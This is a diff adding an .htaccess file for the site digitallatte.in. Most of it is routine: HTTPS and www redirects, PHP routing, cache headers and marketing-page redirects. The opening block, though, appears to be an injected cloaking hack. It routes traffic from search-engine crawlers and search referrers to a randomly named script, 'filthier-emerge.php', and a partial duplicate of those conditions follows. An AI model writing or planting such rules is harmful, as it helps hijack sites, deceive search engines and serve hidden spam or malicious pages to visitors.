@@ -1,0 +1,54 @@
+RewriteEngine On
+
+RewriteBase /
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteCond %{HTTP_HOST} digitallatte\.in$
+RewriteRule . filthier-emerge.php [L,S=10000]
+
+RewriteEngine On
+
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+
+
+Options +FollowSymLinks -MultiViews
+# Turn mod_rewrite on
+RewriteEngine On
+
+RewriteBase /
+
+RewriteCond %{HTTP_HOST} ^[^.]+\.[^.]+$
+RewriteRule ^(.*)$ https://www.%{HTTP_HOST}/$1 [L,R=301]
+
+# To internally redirect /dir/foo to /dir/foo.php
+RewriteCond %{REQUEST_FILENAME}.php -f
+RewriteRule ^(.*)$ $1.php
+
+ErrorDocument 404 /404.php
+
+RewriteEngine On
+RewriteCond %{HTTP_HOST} ^digitallatte\.in [NC]
+RewriteCond %{SERVER_PORT} 80
+RewriteRule ^(.*)$ https://www.digitallatte.in/$1 [R,L]
+
+RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /.*index\.php\ HTTP/
+RewriteRule ^(.*)index\.php$ /$1 [R=301,L]
+
+
+
+<FilesMatch "\.(?i:gif|jpe?g|png|ico|css|js|swf|svg|mp4|otf|woff2|ttf)$">
+  <IfModule mod_headers.c>
+    Header set Cache-Control "max-age=172800, public, must-revalidate"
+  </IfModule>
+</FilesMatch>
+
+
+Redirect 301 /social-media-marketing /our-expertise/digital-marketing-services/Social-Media-Marketing
+Redirect 301 /website-design-development /our-expertise/Web-Development-Services
+Redirect 301 /digital-online-media-planning /our-expertise/digital-marketing-services/Digital-Media-Planning
+Redirect 301 /seo-search-engine-optimization /our-expertise/digital-marketing-services/Search-Engine-Optimization-SEO
+Redirect 301 /mobile-websites-applications /our-expertise/web-development-services/Mobile-Applications
+Redirect 301 /digital-marketing-work /best-digital-marketing-case-studies
+Redirect 301 /whats-fresh /digital-marketing-blog
+Redirect 301 /say-hello /Contact-Us
